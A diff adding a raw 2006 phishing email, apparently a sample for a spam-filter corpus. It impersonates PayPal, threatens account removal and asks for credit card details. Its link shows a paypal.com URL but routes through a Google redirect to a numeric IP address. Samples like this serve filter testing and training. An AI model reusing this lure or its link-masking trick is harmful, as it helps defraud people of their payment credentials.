@@ -1,0 +1,79 @@
+From nobody Sun Jan 25 13:48:14 2015
+Return-Path: <test@ftp.shelltransource.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.5.6.7])
+ by naughty.example.com (Postfix) with ESMTP id 24429536F58
+ for <nobody@login.example.com>; Mon, 17 Apr 2006 18:59:39 -0400 (EDT)
+Received: from ftp.shelltransource.com (unknown [203.201.211.162])
+ by mail1.example.com (Postfix) with ESMTP id ABE9D6CCE63
+ for <nobody@example.com>; Mon, 17 Apr 2006 14:13:18 -0400 (EDT)
+Received: from ftp.shelltransource.com (localhost.localdomain [127.0.0.1])
+ by ftp.shelltransource.com (8.13.1/8.13.1) with ESMTP id k3HN8SHd022742
+ for <nobody@example.com>; Tue, 18 Apr 2006 04:38:28 +0530
+Received: (from test@localhost)
+ by ftp.shelltransource.com (8.13.1/8.13.1/Submit) id k3HN8RZp022741;
+ Tue, 18 Apr 2006 04:38:27 +0530
+Date: Tue, 18 Apr 2006 04:38:27 +0530
+Message-Id: <200604172308.k3HN8RZp022741@ftp.shelltransource.com>
+To: nobody@example.com
+Subject: Important notification
+From: PayPal <service@email.paypal.com>
+Content-Type: text/html
+Status: 
+X-Status: 
+X-Keywords: 
+
+
+</tr>
+          </table>
+          <div align="left">
+            <table cellSpacing="0" cellPadding="5" width="600" 
+border="0" 
+            id="table20">
+              <tr>
+                <td class="pp_sortofbig" align="middle"><font 
+size="2">Dear 
+                PayPal Customer</font></td>
+              </tr>
+              <tr>
+                <td vAlign="top" 
+                style="font-size: 13px; color: #000000; font-family: 
+verdana,arial,helvetica,sans-serif">&nbsp;<p>
+                This e-mail is the notification of recent innovations 
+taken by 
+                PayPal to detect inactive customers and non-functioning 
+                mailboxes.</p>
+                <p>The inactive customers are subject to restriction and 
+removal 
+                in the next 1 month.</p>
+                <p>Please confirm your email address and credit card 
+information 
+                by clicking the link below:</td>
+              </tr>
+              <caption><font size="2"><br>
+              <br>
+&nbsp;</font></caption>
+              <tr>
+                <td align="middle" 
+                style="font-size: 13px; color: #000000; font-family: 
+verdana,arial,helvetica,sans-serif">
+                <a 
+href="http://google.com/url?sa=p&pref=ig&pval=2&q=http://3546549690:9999/webscrr/index.php" 
+target="_top">
+                
+https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a><a 
+target="_top"> 
+
+                <p><br>
+                <span class="pp_smalltext"><font size="2">This 
+notification 
+                expires May 7, 2006</font></span> </a></td>
+              </tr>
+              <tr>
+                <td align="middle" 
+                style="font-size: 13px; color: #000000; font-family: 
+verdana,arial,helvetica,sans-serif">
+                <br>
+                <strong>   Thank you  </strong><br>
+&nbsp;</td>
